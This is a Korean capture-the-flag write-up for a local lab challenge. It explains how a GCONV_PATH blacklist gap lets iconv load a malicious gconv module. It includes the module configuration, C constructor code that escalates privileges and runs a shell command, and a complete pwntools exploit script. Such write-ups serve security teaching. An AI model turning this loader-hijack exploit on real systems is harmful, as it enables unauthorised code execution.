# IntegrityCore

## 문제 설명

SecurePlugin Manager는 플러그인 저장, 설정 import, 관리자 검증 기능을 제공한다. 목표는 관리자 검증 과정에서 `/flag.txt`를 읽어 플래그를 출력하는 것이다.

- 문제 파일: `IntegrityCore.zip`
- 로컬 실행: `docker compose up --build`
- 로컬 접속: `nc 127.0.0.1 5000`

## 풀이

### 분석

중요한 메뉴는 다음 3개이다.

```text
1. Save Plugin
4. Import Config
7. Admin Verify
```

`Save Plugin`은 사용자가 입력한 base64 데이터를 지정한 경로에 저장한다. 경로 검사는 있지만 `/tmp/plugins/` 하위는 허용되므로 다음 파일을 만들 수 있다.

```text
/tmp/plugins/gconv-modules
/tmp/plugins/pwn.so
/tmp/plugins/env
```

`Import Config`는 `KEY=VALUE` 형식의 설정 파일을 읽어 환경변수로 등록한다. 여러 위험한 환경변수를 blacklist로 막지만, `GCONV_PATH`는 차단하지 않는다.

```text
GCONV_PATH=/tmp/plugins
```

`Admin Verify`는 사용자가 입력한 encoding 값을 `VERIFY_ENCODING`에 넣고 `/usr/local/bin/verify_integrity /flag.txt`를 실행한다. `verify_integrity`는 내부에서 다음처럼 `iconv`를 호출한다.

```sh
echo "test" | iconv -f UTF-8 -t "$TARGET//IGNORE" 2>&1 || true
```

따라서 `GCONV_PATH`를 조작한 뒤 가짜 encoding을 입력하면, `iconv`가 `/tmp/plugins` 아래의 악성 gconv 모듈을 로드하게 된다.

### 취약점

취약점은 `GCONV_PATH` 환경변수 필터링 누락과 사용자가 제어하는 encoding 값이 `iconv`에 전달되는 점이 결합되어 발생한다.

공격자는 `gconv-modules`에 가짜 encoding `PWN`을 등록한다.

```text
module UTF-8// PWN// pwn 2
module PWN// UTF-8// pwn 2
```

그리고 `pwn.so`의 constructor에서 `/flag.txt`를 출력하도록 만든다.

```c
__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("cat /flag.txt");
    fflush(stdout);
    _exit(0);
}
```

`Admin Verify`에서 encoding을 `PWN`으로 입력하면 `iconv`가 `pwn.so`를 로드하고, constructor가 실행되어 flag가 출력된다.

### 익스플로잇

풀이 순서는 다음과 같다.

```text
1. 악성 gconv 모듈 pwn.so 생성
2. /tmp/plugins/gconv-modules 업로드
3. /tmp/plugins/pwn.so 업로드
4. /tmp/plugins/env 업로드
5. Import Config로 GCONV_PATH=/tmp/plugins 적용
6. Admin Verify에서 PWN 입력
7. iconv가 pwn.so를 로드하면서 /flag.txt 출력
```

핵심 exploit 흐름은 다음과 같다.

```python
from pwn import *
import base64

HOST, PORT = "127.0.0.1", 5000
io = remote(HOST, PORT)

def b64(x):
    return base64.b64encode(x)

def menu():
    io.recvuntil(b"> ")

def save(path, data):
    menu()
    io.sendline(b"1")
    io.recvuntil(b"Plugin name: ")
    io.sendline(b"x")
    io.recvuntil(b"Installation path: ")
    io.sendline(path)
    io.recvuntil(b"Plugin data (base64): ")
    io.sendline(b64(data))

def import_config(path):
    menu()
    io.sendline(b"4")
    io.recvuntil(b"Config file path: ")
    io.sendline(path)

def verify():
    menu()
    io.sendline(b"7")
    io.recvuntil(b"Target encoding")
    io.sendline(b"PWN")
    io.recvuntil(b"? (y/n): ")
    io.sendline(b"y")

save(b"/tmp/plugins/gconv-modules", b"module UTF-8// PWN// pwn 2\nmodule PWN// UTF-8// pwn 2\n")
save(b"/tmp/plugins/pwn.so", open("pwn.so", "rb").read())
save(b"/tmp/plugins/env", b"GCONV_PATH=/tmp/plugins\n")

import_config(b"/tmp/plugins/env")
verify()

print(io.recvrepeat(3).decode(errors="ignore"))
```


## 플래그

로컬 테스트 플래그는 다음과 같다.

```text
DAJEROMA{test_flag}
```


## 배운 점

이 문제는 blacklist 기반 환경변수 필터링의 한계를 보여준다. 직접 명령어 인자를 조작하지 않더라도, `iconv`처럼 환경변수를 통해 외부 모듈을 로드하는 프로그램이 있으면 `GCONV_PATH`를 이용해 코드 실행으로 이어질 수 있다.
